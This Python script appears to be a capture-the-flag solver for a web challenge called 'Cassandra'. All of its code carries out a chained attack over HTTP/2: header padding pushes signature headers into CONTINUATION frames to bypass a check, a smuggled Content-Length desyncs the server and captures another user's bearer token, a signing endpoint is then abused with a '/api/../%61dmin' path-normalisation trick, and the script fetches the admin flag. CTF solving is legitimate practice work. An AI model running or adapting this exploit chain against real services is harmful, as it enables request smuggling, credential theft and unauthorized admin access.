#!/usr/bin/env python3
"""Cassandra method reconstruction (same primitives/endpoints).

Stages: CONTINUATION bypass -> desync bearer capture (/api/notes/201) ->
POST /internal/sign -> GET /admin/flag. Requires the live service.
Needs: pip install h2 hpack hyperframe. Usage: solve.py <host> <port>
"""
import argparse
import json
import re
import socket
import ssl
import time

from h2.config import H2Configuration
from h2.connection import H2Connection

FLAG_RE = re.compile(rb"isfcr\{[^}]+\}")
BEARER_RE = re.compile(rb"Authorization:\s*Bearer\s*(\S+)")

def h2_connect(host, port):
    """Fresh TLS+ALPN-h2 connection with tiny outbound frames (forces CONTINUATION)."""
    cfg = H2Configuration(client_side=True, validate_outbound_headers=False,
                            normalize_outbound_headers=False)
    conn = H2Connection(config=cfg)
    conn.max_outbound_frame_size = 20
    conn.initiate_connection()
    raw = socket.create_connection((host, port), timeout=10)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = ctx.wrap_socket(raw, server_hostname="cassandra.local")
    assert sock.selected_alpn_protocol() == "h2", "ALPN h2 failed"
    sock.sendall(conn.data_to_send())
    return sock, conn


def roundtrip(sock, conn, stream_id, headers, body=None):
    conn.send_headers(stream_id, headers, end_stream=(body is None))
    if body is not None:
        conn.send_data(stream_id, body, end_stream=True)
    sock.sendall(conn.data_to_send())
    sock.settimeout(8)
    status, chunks = None, []
    end = time.time() + 8
    while time.time() < end:
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for ev in conn.receive_data(data):
            if ev.__class__.__name__ == "ResponseReceived":
                for k, v in ev.headers:
                    if k == b":status":
                        status = int(v)
            elif ev.__class__.__name__ == "DataReceived":
                chunks.append(ev.data)
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
            elif ev.__class__.__name__ == "StreamEnded":
                sock.sendall(conn.data_to_send())
                return status, b"".join(chunks)
        sock.sendall(conn.data_to_send())
    return status, b"".join(chunks)


def cont_bypass_probe(host, port):
    sock, conn = h2_connect(host, port)
    try:
        pad = [(f"x-pad-{i}", "A" * 64) for i in range(4)]
        headers = [
            (":method", "GET"), (":authority", "cassandra.local"),
            (":scheme", "https"), (":path", "/admin/flag"),
            *pad,
            ("x-signed-path", "/admin/flag"),  # lands in CONTINUATION
        ]
        status, _ = roundtrip(sock, conn, 1, headers)
        print(f"[*] cont-bypass probe -> {status} (want 401, not 400)")
        return status == 401
    finally:
        sock.close()


def desync_capture(host, port, cl=2000, tries=40):
    """POST /api/notes with smuggled Content-Length, poll /api/notes/201 for bearer."""
    for i in range(tries):
        sock, conn = h2_connect(host, port)
        try:
            prefix = b"A" * 16
            headers = [
                (":method", "POST"), (":authority", "cassandra.local"),
                (":scheme", "https"), (":path", "/api/notes"),
                ("content-type", "application/json"),
                ("content-length", str(cl)),  # smuggled via CONTINUATION
            ]
            body = json.dumps({"text": prefix.decode()}).encode()
            roundtrip(sock, conn, 1, headers, body)
        finally:
            sock.close()
        time.sleep(0.4)  # aim for the lull between 3s monitor ticks
        sock, conn = h2_connect(host, port)
        try:
            headers = [
                (":method", "GET"), (":authority", "cassandra.local"),
                (":scheme", "https"), (":path", "/api/notes/201"),
            ]
            status, data = roundtrip(sock, conn, 1, headers)
            m = BEARER_RE.search(data)
            if m:
                print(f"[*] captured bearer on try {i} (note bytes={len(data)})")
                return m.group(1).decode()
            print(f"[...] try {i}: status={status} bytes={len(data)}")
        finally:
            sock.close()
    raise SystemExit("bearer capture failed: retry during a quieter lull, vary CL 600-4000")


def sign_path(host, port, bearer, raw_path="/api/../%61dmin/flag"):
    """POST /internal/sign with the captured bearer; returns (signed_path, ts, sig)."""
    sock, conn = h2_connect(host, port)
    try:
        headers = [
            (":method", "POST"), (":authority", "cassandra.local"),
            (":scheme", "https"), (":path", "/internal/sign"),
            ("content-type", "application/json"),
            ("authorization", f"Bearer {bearer}"),
        ]
        body = json.dumps({"path": raw_path}).encode()
        status, data = roundtrip(sock, conn, 1, headers, body)
        print(f"[*] sign -> {status}: {data[:160]!r}")
        obj = json.loads(data)
        return obj["path"], str(obj["ts"]), obj["sig"]
    finally:
        sock.close()


def fetch_flag(host, port, signed_path, ts, sig):
    """GET /admin/flag with signature headers smuggled in CONTINUATIONs."""
    sock, conn = h2_connect(host, port)
    try:
        pad = [(f"x-pad-{i}", "B" * 64) for i in range(4)]
        headers = [
            (":method", "GET"), (":authority", "cassandra.local"),
            (":scheme", "https"), (":path", "/admin/flag"),
            *pad,
            ("x-signed-path", signed_path),
            ("x-admin-ts", ts),
            ("x-admin-sig", sig),
        ]
        status, data = roundtrip(sock, conn, 1, headers)
        m = FLAG_RE.search(data)
        print(f"[*] flag fetch -> {status}: {data[:200]!r}")
        return m.group(0).decode() if m else None
    finally:
        sock.close()


def main():
    ap = argparse.ArgumentParser(description="Cassandra reconstruction solver")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--cl", type=int, default=2000, help="smuggled Content-Length (600-4000)")
    args = ap.parse_args()

    cont_bypass_probe(args.host, args.port)
    bearer = desync_capture(args.host, args.port, cl=args.cl)
    # Unquote+normpath trick: signer sees no literal /admin, verifier resolves to /admin/flag.
    spath, ts, sig = sign_path(args.host, args.port, bearer, "/api/../%61dmin/flag")
    flag = fetch_flag(args.host, args.port, spath, ts, sig)  # fresh conn + fresh ts
    if flag:
        print(flag)
    else:
        raise SystemExit("no flag: bearer stale or ts outside +-30s window, retry")


if __name__ == "__main__":
    main()
